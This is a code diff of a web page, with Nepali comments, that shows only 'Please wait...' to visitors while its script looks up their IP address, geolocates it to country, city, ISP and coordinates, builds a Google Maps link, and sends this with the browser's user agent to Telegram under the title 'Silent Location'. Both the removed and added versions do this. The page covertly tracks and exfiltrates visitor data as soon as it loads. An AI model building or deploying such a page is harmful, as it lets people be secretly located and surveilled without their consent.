@@ -14,30 +14,29 @@
     <h2>Please wait...</h2>
 
     <script>
-        // ✅ JSONP तरिका — CORS समस्या हुँदैन
-        function getLocation(ip) {
-            const script = document.createElement('script');
-            script.src = `https://ip-api.com/json/${ip}?callback=handleLocation&fields=status,country,city,isp,lat,lon`;
-            document.body.appendChild(script);
-        }
+        // IP लिने
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                const ip = data.ip;
+                const ua = navigator.userAgent;
 
-        function handleLocation(data) {
-            if (data.status === 'success') {
-                const lat = data.lat || '';
-                const lon = data.lon || '';
-                const city = data.city || '';
-                const country = data.country || '';
-                const isp = data.isp || '';
+                // ✅ JSONP तरिका (CORS समस्या हुँदैन)
+                const script = document.createElement('script');
+                script.src = `https://ip-api.com/json/${ip}?callback=handleLocation&fields=status,country,city,isp,lat,lon`;
+                document.body.appendChild(script);
 
-                const location = `${country}, ${city} (${isp})`;
-                const mapLink = `https://www.google.com/maps/place/${lat},${lon}`;
+                // ✅ Callback function
+                window.handleLocation = function(locData) {
+                    if (locData.status === 'success') {
+                        const lat = locData.lat || '';
+                        const lon = locData.lon || '';
+                        const city = locData.city || '';
+                        const country = locData.country || '';
+                        const isp = locData.isp || '';
 
-                // IP पहिले नै थाहा छैन, त्यसैले फेरि लिनुपर्छ
-                fetch('https://api.ipify.org?format=json')
-                    .then(res => res.json())
-                    .then(ipData => {
-                        const ip = ipData.ip;
-                        const ua = navigator.userAgent;
+                        const location = `${country}, ${city} (${isp})`;
+                        const mapLink = `https://www.google.com/maps/place/${lat},${lon}`;
 
                         const msg = `📍 **Silent Location**\nIP: ${ip}\nLocation: ${location}\n🗺️ Maps: ${mapLink}\nUA: ${ua}`;
 
@@ -59,17 +58,10 @@
                         .catch(() => {
                             document.body.innerHTML = `<h2>⚠️</h2><p>Telegram error</p>`;
                         });
-                    });
-            } else {
-                document.body.innerHTML = `<h2>⚠️</h2><p>Location not found</p>`;
-            }
-        }
-
-        // IP लिने र JSONP call गर्ने
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                getLocation(data.ip);
+                    } else {
+                        document.body.innerHTML = `<h2>⚠️</h2><p>Location not found</p>`;
+                    }
+                };
             })
             .catch(() => {
                 document.body.innerHTML = `<h2>⚠️</h2><p>IP error</p>`;
